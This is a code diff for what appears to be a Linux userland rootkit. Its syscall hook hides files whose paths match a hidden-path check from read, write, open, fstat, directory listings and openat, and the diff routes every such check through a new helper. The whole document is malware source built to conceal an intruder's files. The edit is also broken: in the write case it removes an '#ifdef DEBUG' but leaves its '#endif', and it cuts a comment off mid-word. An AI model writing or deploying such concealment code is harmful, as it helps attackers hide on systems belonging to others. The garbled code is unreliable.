@@ -11,9 +11,12 @@
 #include <sys/stat.h>
 #include <sys/syscall.h>
 
+#define DEBUG
 #define BUF_SIZE 1024
 #include "utils/fd2fname.c"
+#include "utils/is_hidden.c"
 #include "rkconsts.h"
+
 
 typedef long (*syscall_fn_t)(long, long, long, long, long, long, long);
 
@@ -43,7 +46,7 @@ static long hook_function(long a1, long a2, long a3,
             char path[256];
             int fd = (int)a2;
             fd_to_fname(fd, path, sizeof(path));
-            if (strstr(path, HIDDEN_PATH_STR) != NULL) {
+            if (check_if_hidden_path(path)) {
                 #ifdef DEBUG
                 printf("[!] Hiding file %s from read\n", path);
                 #endif
@@ -52,14 +55,13 @@ static long hook_function(long a1, long a2, long a3,
             break;
         }
         case 1: {
-            // ssize_t write(int fd, const void *buf, size_t count); 
-            #ifdef DEBUG
+            // ssize_t write(int fd, const void *buf, size_
             printf("[-] write hooked!\n");
             #endif
             char path[256];
             int fd = (int)a2;
             fd_to_fname(fd, path, sizeof(path));
-            if (strstr(path, HIDDEN_PATH_STR) != NULL) {
+            if (check_if_hidden_path(path)) {
                 #ifdef DEBUG
                 printf("[!] Hiding file %s from wrute\n", path);
                 #endif
@@ -73,7 +75,7 @@ static long hook_function(long a1, long a2, long a3,
             printf("[-] open hooked!\n");
             #endif
             const char *path = (const char *)a2;
-            if (strstr(path, HIDDEN_PATH_STR) != NULL) {
+            if (check_if_hidden_path(path)) {
                 #ifdef DEBUG
                 printf("[!] Hiding file %s from open\n", path);
                 #endif
@@ -81,6 +83,17 @@ static long hook_function(long a1, long a2, long a3,
             }
             break;
         }
+        // case 3: {
+        //     // int close(int fd);
+        //     #ifdef DEBUG
+        //     printf("[-] close hooked!\n");
+        //     #endif
+        //     int fd;
+        //     char path[256];
+        //     fd = (int)a2;
+        //     fd_to_fname(fd, path, sizeof(path));
+        //     break;
+        // }
         case 5: {
             // int fstat(int fd, struct stat *statbuf);
             #ifdef DEBUG
@@ -93,7 +106,7 @@ static long hook_function(long a1, long a2, long a3,
             #ifdef DEBUG
             printf("path: %s\n", path);
             #endif 
-            if (strstr(path, HIDDEN_PATH_STR) != NULL) {
+            if (check_if_hidden_path(path)) {
                 #ifdef DEBUG
                 printf("[!] Hiding file %s from fstat\n", path);
                 #endif
@@ -125,7 +138,7 @@ static long hook_function(long a1, long a2, long a3,
                     struct linux_dirent64 *d, *valid_d; 
                     d = (struct linux_dirent64 *)(tmpbuf + bpos);
                     // printf("%s\n", d->d_name);
-                    if (strstr(d->d_name, HIDDEN_PATH_STR) != NULL) {
+                    if (check_if_hidden_path(d->d_name)) {
                         #ifdef DEBUG
                         printf("[!] Hiding file %s from getdents64\n", d->d_name);
                         #endif
@@ -154,7 +167,7 @@ static long hook_function(long a1, long a2, long a3,
             printf("[-] openat hooked!\n");
             #endif
             char *path = (char *)a3;
-            if (strstr(path, HIDDEN_PATH_STR) != NULL) {
+            if (check_if_hidden_path(path)) {
                 #ifdef DEBUG
                 printf("[!] Hiding file %s\n", path);
                 #endif
